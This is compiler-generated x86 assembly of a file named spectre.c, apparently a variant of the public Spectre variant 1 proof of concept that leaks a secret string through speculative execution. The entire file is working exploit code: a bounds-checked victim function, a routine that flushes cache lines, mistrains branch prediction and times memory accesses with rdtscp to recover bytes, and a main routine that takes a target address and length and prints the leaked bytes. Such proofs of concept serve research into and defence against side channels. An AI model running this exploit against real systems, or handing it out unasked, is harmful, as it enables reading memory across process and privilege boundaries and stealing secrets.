	.file	"spectre.c"
	.text
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array2
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	secret
	.section	.rodata
	.align 4
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.text
	.globl	check
	.type	check, @function
check:
.LFB4271:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	array1_size@GOTOFF(%eax), %eax
	cmpl	%eax, 8(%ebp)
	jnb	.L2
	movl	$1, %eax
	jmp	.L3
.L2:
	movl	$0, %eax
.L3:
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4271:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4272:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	array1_size@GOTOFF(%eax), %edx
	cmpl	%edx, 8(%ebp)
	jnb	.L6
	movl	8(%ebp), %edx
	addl	%edx, %edx
	movzbl	array1@GOTOFF(%eax,%edx), %edx
	movzbl	%dl, %edx
	sall	$9, %edx
	movzbl	array2@GOTOFF(%eax,%edx), %ecx
	movzbl	temp@GOTOFF(%eax), %edx
	andl	%ecx, %edx
	movb	%dl, temp@GOTOFF(%eax)
.L6:
	nop
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4272:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4273:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register 5
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$92, %esp
	.cfi_offset 7, -12
	.cfi_offset 6, -16
	.cfi_offset 3, -20
	call	__x86.get_pc_thunk.bx
	addl	$_GLOBAL_OFFSET_TABLE_, %ebx
	movl	12(%ebp), %eax
	movl	%eax, -92(%ebp)
	movl	16(%ebp), %eax
	movl	%eax, -96(%ebp)
	movl	%gs:20, %eax
	movl	%eax, -28(%ebp)
	xorl	%eax, %eax
	movl	$0, -84(%ebp)
	movl	$0, -72(%ebp)
	jmp	.L8
.L9:
	movl	-72(%ebp), %eax
	movl	$0, results.0@GOTOFF(%ebx,%eax,4)
	addl	$1, -72(%ebp)
.L8:
	cmpl	$255, -72(%ebp)
	jle	.L9
	movl	$999, -76(%ebp)
	jmp	.L10
.L30:
	movl	$0, -72(%ebp)
	jmp	.L11
.L12:
	movl	-72(%ebp), %eax
	sall	$9, %eax
	movl	%eax, %edx
	leal	array2@GOTOFF(%ebx), %eax
	addl	%edx, %eax
	movl	%eax, -44(%ebp)
	movl	-44(%ebp), %eax
	clflush	(%eax)
	nop
	addl	$1, -72(%ebp)
.L11:
	cmpl	$255, -72(%ebp)
	jle	.L12
	movl	array1_size@GOTOFF(%ebx), %ecx
	movl	-76(%ebp), %eax
	cltd
	idivl	%ecx
	movl	%edx, %eax
	movl	%eax, -60(%ebp)
	movl	$29, -68(%ebp)
	jmp	.L13
.L16:
	leal	array1_size@GOTOFF(%ebx), %eax
	movl	%eax, -40(%ebp)
	movl	-40(%ebp), %eax
	clflush	(%eax)
	nop
	movl	$0, -80(%ebp)
	jmp	.L14
.L15:
	movl	-80(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -80(%ebp)
.L14:
	movl	-80(%ebp), %eax
	cmpl	$99, %eax
	jle	.L15
	movl	-68(%ebp), %ecx
	movl	$715827883, %edx
	movl	%ecx, %eax
	imull	%edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%edx), %eax
	movw	$0, %ax
	movl	%eax, -48(%ebp)
	movl	-48(%ebp), %eax
	shrl	$16, %eax
	orl	%eax, -48(%ebp)
	movl	8(%ebp), %eax
	xorl	-60(%ebp), %eax
	andl	-48(%ebp), %eax
	xorl	-60(%ebp), %eax
	movl	%eax, -48(%ebp)
	pushl	-48(%ebp)
	call	victim_function
	addl	$4, %esp
	subl	$1, -68(%ebp)
.L13:
	cmpl	$0, -68(%ebp)
	jns	.L16
	movl	$0, -72(%ebp)
	jmp	.L17
.L21:
	movl	-72(%ebp), %eax
	imull	$167, %eax, %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -56(%ebp)
	movl	-56(%ebp), %eax
	sall	$9, %eax
	movl	%eax, %edx
	leal	array2@GOTOFF(%ebx), %eax
	addl	%edx, %eax
	movl	%eax, -52(%ebp)
	leal	-84(%ebp), %eax
	movl	%eax, -32(%ebp)
	rdtscp
	movl	%ecx, %esi
	movl	-32(%ebp), %ecx
	movl	%esi, (%ecx)
	movl	%eax, -104(%ebp)
	movl	%edx, -100(%ebp)
	movl	-52(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -84(%ebp)
	leal	-84(%ebp), %eax
	movl	%eax, -36(%ebp)
	rdtscp
	movl	%ecx, %esi
	movl	-36(%ebp), %ecx
	movl	%esi, (%ecx)
	movl	%eax, %esi
	movl	%edx, %edi
	subl	-104(%ebp), %esi
	sbbl	-100(%ebp), %edi
	movl	$100, %edx
	movl	$0, %eax
	cmpl	%esi, %edx
	sbbl	%edi, %eax
	jc	.L20
	movl	array1_size@GOTOFF(%ebx), %ecx
	movl	-76(%ebp), %eax
	cltd
	idivl	%ecx
	movl	%edx, %eax
	movzbl	array1@GOTOFF(%ebx,%eax), %eax
	movzbl	%al, %eax
	cmpl	%eax, -56(%ebp)
	je	.L20
	movl	-56(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	leal	1(%eax), %edx
	movl	-56(%ebp), %eax
	movl	%edx, results.0@GOTOFF(%ebx,%eax,4)
.L20:
	addl	$1, -72(%ebp)
.L17:
	cmpl	$255, -72(%ebp)
	jle	.L21
	movl	$-1, -64(%ebp)
	movl	-64(%ebp), %eax
	movl	%eax, -68(%ebp)
	movl	$0, -72(%ebp)
	jmp	.L22
.L27:
	cmpl	$0, -68(%ebp)
	js	.L23
	movl	-72(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %edx
	movl	-68(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	cmpl	%eax, %edx
	jl	.L24
.L23:
	movl	-68(%ebp), %eax
	movl	%eax, -64(%ebp)
	movl	-72(%ebp), %eax
	movl	%eax, -68(%ebp)
	jmp	.L25
.L24:
	cmpl	$0, -64(%ebp)
	js	.L26
	movl	-72(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %edx
	movl	-64(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	cmpl	%eax, %edx
	jl	.L25
.L26:
	movl	-72(%ebp), %eax
	movl	%eax, -64(%ebp)
.L25:
	addl	$1, -72(%ebp)
.L22:
	cmpl	$255, -72(%ebp)
	jle	.L27
	movl	-64(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	addl	$2, %eax
	leal	(%eax,%eax), %edx
	movl	-68(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	cmpl	%eax, %edx
	jl	.L28
	movl	-68(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	cmpl	$2, %eax
	jne	.L29
	movl	-64(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	testl	%eax, %eax
	je	.L28
.L29:
	subl	$1, -76(%ebp)
.L10:
	cmpl	$0, -76(%ebp)
	jg	.L30
.L28:
	movl	results.0@GOTOFF(%ebx), %eax
	movl	%eax, %edx
	movl	-84(%ebp), %eax
	xorl	%edx, %eax
	movl	%eax, results.0@GOTOFF(%ebx)
	movl	-68(%ebp), %eax
	movl	%eax, %edx
	movl	-92(%ebp), %eax
	movb	%dl, (%eax)
	movl	-68(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %edx
	movl	-96(%ebp), %eax
	movl	%edx, (%eax)
	movl	-92(%ebp), %eax
	addl	$1, %eax
	movl	-64(%ebp), %edx
	movb	%dl, (%eax)
	movl	-96(%ebp), %eax
	leal	4(%eax), %edx
	movl	-64(%ebp), %eax
	movl	results.0@GOTOFF(%ebx,%eax,4), %eax
	movl	%eax, (%edx)
	nop
	movl	-28(%ebp), %eax
	subl	%gs:20, %eax
	je	.L31
	call	__stack_chk_fail_local
.L31:
	leal	-12(%ebp), %esp
	popl	%ebx
	.cfi_restore 3
	popl	%esi
	.cfi_restore 6
	popl	%edi
	.cfi_restore 7
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4273:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
	.align 4
.LC1:
	.string	"Putting '%s' in memory, address %p\n"
.LC2:
	.string	"%p"
.LC3:
	.string	"%d"
	.align 4
.LC4:
	.string	"Trying malicious_x = %p, len = %d\n"
.LC5:
	.string	"Reading %d bytes:\n"
	.align 4
.LC6:
	.string	"Reading at malicious_x = %p secc= %c ..."
.LC7:
	.string	"Success"
.LC8:
	.string	"Unclear"
.LC9:
	.string	"%s: "
.LC10:
	.string	"0x%02X='%c' score=%d "
	.align 4
.LC11:
	.string	"(second best: 0x%02X='%c' score=%d)"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4274:
	.cfi_startproc
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	pushl	%ebp
	movl	%esp, %ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	pushl	%esi
	pushl	%ebx
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x74,0x6
	.cfi_escape 0x10,0x6,0x2,0x75,0x7c
	.cfi_escape 0x10,0x3,0x2,0x75,0x78
	subl	$76, %esp
	call	__x86.get_pc_thunk.bx
	addl	$_GLOBAL_OFFSET_TABLE_, %ebx
	movl	%ecx, %esi
	movl	4(%esi), %eax
	movl	%eax, -76(%ebp)
	movl	%gs:20, %eax
	movl	%eax, -28(%ebp)
	xorl	%eax, %eax
.L50:
	call	getchar@PLT
	movb	%al, -57(%ebp)
	cmpb	$114, -57(%ebp)
	jne	.L33
	movl	secret@GOTOFF(%ebx), %edx
	movl	secret@GOTOFF(%ebx), %eax
	subl	$4, %esp
	pushl	%edx
	pushl	%eax
	leal	.LC1@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	movl	secret@GOTOFF(%ebx), %eax
	leal	array1@GOTOFF(%ebx), %edx
	subl	%edx, %eax
	movl	%eax, -56(%ebp)
	movl	secret@GOTOFF(%ebx), %eax
	subl	$12, %esp
	pushl	%eax
	call	strlen@PLT
	addl	$16, %esp
	movl	%eax, -52(%ebp)
	movl	$0, -48(%ebp)
	jmp	.L34
.L35:
	leal	array2@GOTOFF(%ebx), %edx
	movl	-48(%ebp), %eax
	addl	%edx, %eax
	movb	$1, (%eax)
	addl	$1, -48(%ebp)
.L34:
	cmpl	$131071, -48(%ebp)
	jbe	.L35
	cmpl	$3, (%esi)
	jne	.L36
	movl	-76(%ebp), %eax
	addl	$4, %eax
	movl	(%eax), %eax
	subl	$4, %esp
	leal	-56(%ebp), %edx
	pushl	%edx
	leal	.LC2@GOTOFF(%ebx), %edx
	pushl	%edx
	pushl	%eax
	call	__isoc99_sscanf@PLT
	addl	$16, %esp
	movl	-56(%ebp), %eax
	leal	array1@GOTOFF(%ebx), %edx
	subl	%edx, %eax
	movl	%eax, -56(%ebp)
	movl	-76(%ebp), %eax
	addl	$8, %eax
	movl	(%eax), %eax
	subl	$4, %esp
	leal	-52(%ebp), %edx
	pushl	%edx
	leal	.LC3@GOTOFF(%ebx), %edx
	pushl	%edx
	pushl	%eax
	call	__isoc99_sscanf@PLT
	addl	$16, %esp
	movl	-52(%ebp), %eax
	movl	-56(%ebp), %edx
	subl	$4, %esp
	pushl	%eax
	pushl	%edx
	leal	.LC4@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
.L36:
	movl	-52(%ebp), %eax
	subl	$8, %esp
	pushl	%eax
	leal	.LC5@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	movl	$0, -44(%ebp)
	jmp	.L37
.L45:
	movl	secret@GOTOFF(%ebx), %edx
	movl	-44(%ebp), %eax
	addl	%edx, %eax
	movzbl	(%eax), %eax
	movsbl	%al, %eax
	movl	-56(%ebp), %edx
	subl	$4, %esp
	pushl	%eax
	pushl	%edx
	leal	.LC6@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	addl	$1, -44(%ebp)
	movl	-56(%ebp), %eax
	shrl	%eax
	movl	%eax, %edx
	subl	$4, %esp
	leal	-40(%ebp), %eax
	pushl	%eax
	leal	-30(%ebp), %eax
	pushl	%eax
	pushl	%edx
	call	readMemoryByte
	addl	$16, %esp
	movl	-56(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -56(%ebp)
	movl	-40(%ebp), %eax
	movl	-36(%ebp), %edx
	addl	%edx, %edx
	cmpl	%edx, %eax
	jl	.L38
	leal	.LC7@GOTOFF(%ebx), %eax
	jmp	.L39
.L38:
	leal	.LC8@GOTOFF(%ebx), %eax
.L39:
	subl	$8, %esp
	pushl	%eax
	leal	.LC9@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	movl	-40(%ebp), %ecx
	movzbl	-30(%ebp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-30(%ebp), %eax
	cmpb	$126, %al
	ja	.L40
	movzbl	-30(%ebp), %eax
	movzbl	%al, %eax
	jmp	.L41
.L40:
	movl	$63, %eax
.L41:
	movzbl	-30(%ebp), %edx
	movzbl	%dl, %edx
	pushl	%ecx
	pushl	%eax
	pushl	%edx
	leal	.LC10@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	movl	-36(%ebp), %eax
	testl	%eax, %eax
	jle	.L42
	movl	-36(%ebp), %ecx
	movzbl	-29(%ebp), %eax
	cmpb	$31, %al
	jbe	.L43
	movzbl	-29(%ebp), %eax
	cmpb	$126, %al
	ja	.L43
	movzbl	-29(%ebp), %eax
	movzbl	%al, %eax
	jmp	.L44
.L43:
	movl	$63, %eax
.L44:
	movzbl	-29(%ebp), %edx
	movzbl	%dl, %edx
	pushl	%ecx
	pushl	%eax
	pushl	%edx
	leal	.LC11@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
.L42:
	subl	$12, %esp
	pushl	$10
	call	putchar@PLT
	addl	$16, %esp
.L37:
	movl	-52(%ebp), %eax
	subl	$1, %eax
	movl	%eax, -52(%ebp)
	movl	-52(%ebp), %eax
	testl	%eax, %eax
	jns	.L45
	jmp	.L50
.L33:
	cmpb	$10, -57(%ebp)
	je	.L53
	cmpb	$105, -57(%ebp)
	jne	.L54
	call	getpid@PLT
	movl	%eax, %ecx
	leal	check@GOTOFF(%ebx), %eax
	cltd
	addl	$33, %eax
	adcl	$0, %edx
	pushl	%ecx
	pushl	%edx
	pushl	%eax
	leal	.LC12@GOTOFF(%ebx), %eax
	pushl	%eax
	call	printf@PLT
	addl	$16, %esp
	jmp	.L50
.L53:
	nop
	jmp	.L50
.L54:
	nop
	movl	$0, %eax
	movl	-28(%ebp), %edx
	subl	%gs:20, %edx
	je	.L52
	call	__stack_chk_fail_local
.L52:
	leal	-12(%ebp), %esp
	popl	%ecx
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	popl	%ebx
	.cfi_restore 3
	popl	%esi
	.cfi_restore 6
	popl	%ebp
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4274:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB4275:
	.cfi_startproc
	movl	(%esp), %eax
	ret
	.cfi_endproc
.LFE4275:
	.section	.text.__x86.get_pc_thunk.bx,"axG",@progbits,__x86.get_pc_thunk.bx,comdat
	.globl	__x86.get_pc_thunk.bx
	.hidden	__x86.get_pc_thunk.bx
	.type	__x86.get_pc_thunk.bx, @function
__x86.get_pc_thunk.bx:
.LFB4276:
	.cfi_startproc
	movl	(%esp), %ebx
	ret
	.cfi_endproc
.LFE4276:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
